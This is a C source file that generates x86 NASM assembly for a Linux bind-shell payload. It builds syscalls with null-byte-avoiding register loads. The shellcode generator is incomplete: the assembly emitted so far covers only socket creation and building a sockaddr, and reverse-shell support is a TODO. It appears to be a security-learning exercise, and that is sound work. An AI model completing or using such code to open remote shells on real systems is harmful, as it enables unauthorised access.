#define _XOPEN_SOURCE   700             // needed for dprintf

#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#include <errno.h>
#include <fcntl.h>
#include <unistd.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <sys/syscall.h>
#include <sys/types.h>
#include <sys/stat.h>

#define REG_PORT_MIN    1024            // lowest registered port
#define DEFAULT_PATH    "temp.nasm"

typedef enum {eax, ebx, ecx, edx, esp} reg32_t;

int temp_fd;

const char * header = "; Generated by <whatever I call this>\n\n"
                        "global _start\n\n"
                        "section .text\n"
                        "_start:\n\n";

/* Helper functions */
static const char * enum2reg32(reg32_t reg);
static const char * enum2reg16(reg32_t reg);
static const char * enum2reg8lo(reg32_t reg);
static const char * enum2reg8hi(reg32_t reg);  
static void store_in_reg(uint32_t value, reg32_t reg);


/* To write "recipes" for bind shell, reverse shell, etc. */
static void build_syscall3(uint16_t syscall, uint32_t arg_ebx, uint32_t arg_ecx,
    uint32_t arg_edx); 
static void store_result(reg32_t result, reg32_t destination);
static void build_sockaddr(uint32_t ipv4, uint16_t port, uint16_t family);


static void build_sockaddr(uint32_t ipv4, uint16_t port, uint16_t family)
{
    uint16_t endian_corrected;

    if (0 == ipv4)
    {
        dprintf(temp_fd, "\txor eax, eax\t\t; INADDR_ANY\n"
            "\tpush eax\n");
    }
    else
    {
        dprintf(temp_fd, "\t; TODO: reverse shell will need IP parser\n");
    }

    // TODO: be careful with endianness.... will need to verify
    endian_corrected = htons(port);
    dprintf(temp_fd, "\tpush word 0x%04x\t; PORT=%d\n",
        endian_corrected, port);

    // these are always one byte numbers?
    dprintf(temp_fd, "\tpush word %d\t\t; Family=%d\n\n", 
        family, family);    
}

static const char * enum2reg8hi(reg32_t reg)
{
    char * reg_name;

    switch(reg)
    {
        case eax:
            reg_name = "ah";
            break;
        case ebx:
            reg_name = "bh";
            break;
        case ecx:
            reg_name = "ch";
            break;
        case edx:
            reg_name = "dh";
            break;
        default:
            reg_name = "ERR";
            fprintf(stderr, "[-] Unsupported register #%d\n", reg);
    }

    return reg_name;
}

static void store_result(reg32_t result, reg32_t destination)
{
    dprintf(temp_fd, "\tmov %s, %s\t\t; storing result\n\n",
        enum2reg32(destination), enum2reg32(result));
}

static const char * enum2reg8lo(reg32_t reg)
{
    char * reg_name;

    switch(reg)
    {
        case eax:
            reg_name = "al";
            break;
        case ebx:
            reg_name = "bl";
            break;
        case ecx:
            reg_name = "cl";
            break;
        case edx:
            reg_name = "dl";
            break;
        default:
            reg_name = "ERR";
            fprintf(stderr, "[-] Unsupported register #%d\n", reg);
    }

    return reg_name;
}

static const char * enum2reg16(reg32_t reg)
{
    char * reg_name;

    switch(reg)
    {
        case eax:
            reg_name = "ax";
            break;
        case ebx:
            reg_name = "bx";
            break;
        case ecx:
            reg_name = "cx";
            break;
        case edx:
            reg_name = "dx";
            break;
        default:
            reg_name = "ERR";
            fprintf(stderr, "[-] Unsupported register #%d\n", reg);
    }

    return reg_name;
}

static const char * enum2reg32(reg32_t reg)
{
    char * reg_name;

    switch(reg)
    {
        case eax:
            reg_name = "eax";
            break;
        case ebx:
            reg_name = "ebx";
            break;
        case ecx:
            reg_name = "ecx";
            break;
        case edx:
            reg_name = "edx";
            break;
        case esp:
            reg_name = "esp";
            break;
        default:
            reg_name = "ERR";
            fprintf(stderr, "[-] Unsupported register #%d\n", reg);
    }

    return reg_name;
}

static void store_in_reg(uint32_t value, reg32_t reg)
{
    if (value > UINT16_MAX)
    {
        // No need to zero it out first
        dprintf(temp_fd, "\tmov %s, %d\n",
            enum2reg32(reg), value);
        // TODO: handle zeros in 0xZZ000000
    }
    else if (value <= UINT8_MAX)
    {
        dprintf(temp_fd, "\txor %s, %s\n", 
            enum2reg32(reg), enum2reg32(reg));  

        if (0 == value)
        {
            return;
        }
        else
        {
            dprintf(temp_fd, "\tmov %s, %d\n",
                enum2reg8lo(reg), value);
        }  
    }
    else if (value <= UINT16_MAX)
    {

        dprintf(temp_fd, "\txor %s, %s\n", 
            enum2reg32(reg), enum2reg32(reg));    

        if ((value & 0xff00) == value)
        {
            // Avoid null if lower order byte is 0x00
            dprintf(temp_fd, "\tmov %s, %d\n",
                enum2reg8hi(reg), value >> 8);
        }
        else
        {
            dprintf(temp_fd, "\tmov %s, %d\n",
                enum2reg16(reg), value);
        } 

    }
    else
    {
        dprintf(temp_fd, "\t; Unexpected error\n");
    }
}

static void build_syscall3(uint16_t syscall, uint32_t arg_ebx, uint32_t arg_ecx,
    uint32_t arg_edx)
{
    dprintf(temp_fd, "\t; Syscall %d: (%d, %d, %d)\n",
        syscall, arg_ebx, arg_ecx, arg_edx);

    store_in_reg(syscall, eax);
    store_in_reg(arg_ebx, ebx);
    store_in_reg(arg_ecx, ecx);
    store_in_reg(arg_edx, edx);
    
    dprintf(temp_fd, "\tint 0x80\n\n"); 
} 

int main(int argc, char * argv[])
{
    uint16_t port;
    ssize_t written;

    if (argc < 2)
    {
        printf("Usage: %s <port number>\n"
            "\tE.g. %s 1337\n", argv[0], argv[0]);

        return EXIT_FAILURE;
    }
    else
    {
        port = atoi(argv[1]);
    }
    
    printf("[!] Generating bind shell on port %d\n", port);
    
    if (0 == port)
    {
        printf("[!] Port 0? Living dangerously, eh.\n");
    }
    if (port < REG_PORT_MIN)
    {
        printf("[!] You may need root to bind to a port below %d\n",
            REG_PORT_MIN);
    }    

    temp_fd = open(DEFAULT_PATH, O_WRONLY | O_CREAT | O_TRUNC, S_IRWXU);

    if (temp_fd < 0)
    {
        perror("open()");
        return EXIT_FAILURE;
    }

    written = write(temp_fd, header, strlen(header));

    // socket(AF_INET, SOCK_STREAM, 0)
    build_syscall3(SYS_socket, AF_INET, SOCK_STREAM, 0);
    
    // store socket fd
    store_result(eax, ebx);

    // build sockaddr on the stack
    build_sockaddr(INADDR_ANY, port, AF_INET);

    // stack pointer into ecx
    store_result(esp, ecx); 

    if (close(temp_fd))
    {
        perror("close()");
        return EXIT_FAILURE;
    }

    printf("[+] Generated %s.\n", DEFAULT_PATH); 

    return EXIT_SUCCESS;
}
